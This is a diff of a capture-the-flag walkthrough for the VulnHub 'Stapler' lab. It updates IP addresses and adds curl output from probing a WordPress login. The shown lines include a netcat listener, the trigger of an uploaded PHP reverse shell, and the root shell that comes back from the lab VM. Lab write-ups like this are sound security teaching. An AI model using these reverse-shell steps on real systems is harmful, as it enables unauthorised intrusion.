@@ -467,14 +467,14 @@ ftp $STAPLER_IP
 ```
 returns a login
 ```
-Connected to 192.168.56.105.
+Connected to 192.168.56.104.
 220-
 220-|-----------------------------------------------------------------------------------------|
 220-| Harry, make sure to update the banner when you get a chance to show who has access here |
 220-|-----------------------------------------------------------------------------------------|
 220-
 220 
-Name (192.168.56.105:bhero): 
+Name (192.168.56.104:bhero): 
 # another user harry
 ```
 lets try be anonymous:
@@ -780,7 +780,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
 bhero@bh-t430:~/Documents/git_site/bovinehero.github.io/assets/vulnhub_stuff/stapler$ nmap -A -p 22 $STAPLER_IP
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-06 10:24 BST
-Nmap scan report for 192.168.56.105
+Nmap scan report for 192.168.56.104
 Host is up (0.00040s latency).
 
 PORT   STATE SERVICE VERSION
@@ -1028,11 +1028,67 @@ Lets check if there is a default admin page: https://192.168.56.104:12380/blogbl
 
 theres a bit of a redirect, lets curl it and view the headers
 
-> TODO get outputs
+``` bash
+curl -k https://$STAPLER_IP:12380/blogblog/wp-admin -I
+```
+
+gives us a redirect
 
 ```
-curl -k https://$STAPLER_IP:12380/blogblog/wp-admin -I
+HTTP/1.1 301 Moved Permanently
+Date: Fri, 06 Sep 2019 10:34:21 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Location: https://192.168.56.104:12380/blogblog/wp-admin/
+Content-Type: text/html; charset=iso-8859-1
+```
+
+lets follow
+
+``` bash
 curl -k https://$STAPLER_IP:12380/blogblog/wp-admin -IL
+```
+
+```
+HTTP/1.1 301 Moved Permanently
+Date: Fri, 06 Sep 2019 10:34:54 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Location: https://192.168.56.104:12380/blogblog/wp-admin/
+Content-Type: text/html; charset=iso-8859-1
+
+HTTP/1.1 302 Found
+Date: Fri, 06 Sep 2019 10:34:54 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+Pragma: no-cache
+Location: https://192.168.56.104:12380/blogblog/wp-login.php?redirect_to=https%3A%2F%2F192.168.56.104%3A12380%2Fblogblog%2Fwp-admin%2F&reauth=1
+Dave: Soemthing doesn't look right here
+Content-Type: text/html; charset=UTF-8
+
+HTTP/1.1 200 OK
+Date: Fri, 06 Sep 2019 10:34:54 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+Pragma: no-cache
+Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/blogblog/; secure
+X-Frame-Options: SAMEORIGIN
+Set-Cookie: wordpress_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/wp-admin
+Set-Cookie: wordpress_sec_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/wp-admin
+Set-Cookie: wordpress_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/wp-content/plugins
+Set-Cookie: wordpress_sec_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/wp-content/plugins
+Set-Cookie: wordpress_logged_in_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
+Set-Cookie: wordpress_logged_in_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
+Set-Cookie: wordpress_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
+Set-Cookie: wordpress_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
+Set-Cookie: wordpress_sec_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
+Set-Cookie: wordpress_sec_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
+Set-Cookie: wordpressuser_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
+Set-Cookie: wordpresspass_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
+Set-Cookie: wordpressuser_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
+Set-Cookie: wordpresspass_965fb24d018fde9d172cb472351bff46=+; expires=Thu, 06-Sep-2018 10:34:54 GMT; Max-Age=-31536000; path=/blogblog/
+Dave: Soemthing doesn't look right here
+Content-Type: text/html; charset=UTF-8
 ```
 
 Some Custom headers, auth perhaps? Remember the source code from the share? 
@@ -1040,6 +1096,8 @@ Might be worth investigating that later if we get stuck. - Spoiler we won't
 
 A source code audit is not my strong suit, I'll put a pin in that to revisit.
 Instead lets look to WP to see if it is carrying any of its halmark weaknesses... users and plugins!
+
+> TODO add files
 
 first lets kick off a nikto scan:
 ``` bash
@@ -1385,7 +1443,7 @@ Ok so now we attempt to bounce a shell back to the listner we set up:
 nc -nvlp 1337
 ```
 
-and then we visit: https://192.168.56.105:12380/blogblog/wp-content/uploads/php-reverse-shell.php
+and then we visit: https://192.168.56.104:12380/blogblog/wp-content/uploads/php-reverse-shell.php
 
 And nothing! Just a spining web loading page.
 If we wait long enough we'll see that we have code execution as the following error gets returned:
@@ -1447,7 +1505,7 @@ We get a connection on our listener:
 
 ```
 listening on [any] 21 ...
-connect to [192.168.56.1] from (UNKNOWN) [192.168.56.105] 58040
+connect to [192.168.56.1] from (UNKNOWN) [192.168.56.104] 58040
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
@@ -1600,7 +1658,7 @@ after a quick cup of hot beverage we catch the shell and run an id:
 
 ```
 listening on [any] 1337 ...
-connect to [192.168.56.1] from (UNKNOWN) [192.168.56.105] 50986
+connect to [192.168.56.1] from (UNKNOWN) [192.168.56.104] 50986
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
